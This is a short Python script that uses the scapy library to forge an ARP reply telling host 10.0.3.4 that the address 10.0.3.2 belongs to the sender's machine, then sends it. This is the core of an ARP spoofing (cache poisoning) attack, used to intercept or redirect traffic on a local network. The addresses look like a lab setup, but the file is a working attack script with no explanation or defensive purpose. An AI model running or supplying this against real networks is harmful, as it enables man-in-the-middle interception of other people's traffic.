#!/usr/bin/env python
import scapy.all as scapy

packet = scapy.ARP(op=2,pdst="10.0.3.4", hwdst="52:54:00:12:35:04", psrc="10.0.3.2")
# print(packet.show())
# print(packet.summary())
scapy.send(packet)